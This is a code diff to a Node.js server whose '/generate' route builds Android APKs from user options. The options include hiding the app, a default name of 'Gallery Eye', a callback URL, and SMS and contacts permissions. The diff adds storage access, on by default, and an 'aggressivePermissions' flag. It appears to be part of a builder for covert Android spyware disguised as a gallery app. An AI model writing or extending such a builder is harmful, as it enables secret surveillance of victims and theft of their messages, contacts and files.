@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, aggressivePermissions } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -193,7 +193,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 webLink: webLink || "",
                 appName: appName || "Gallery Eye",
                 enableSmsPermission: enableSmsPermission === 'true',
-                enableContactsPermission: enableContactsPermission === 'true'
+                enableContactsPermission: enableContactsPermission === 'true',
+                enableStoragePermission: enableStoragePermission !== 'false', // Default to true
+                aggressivePermissions: aggressivePermissions === 'true'
             };
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
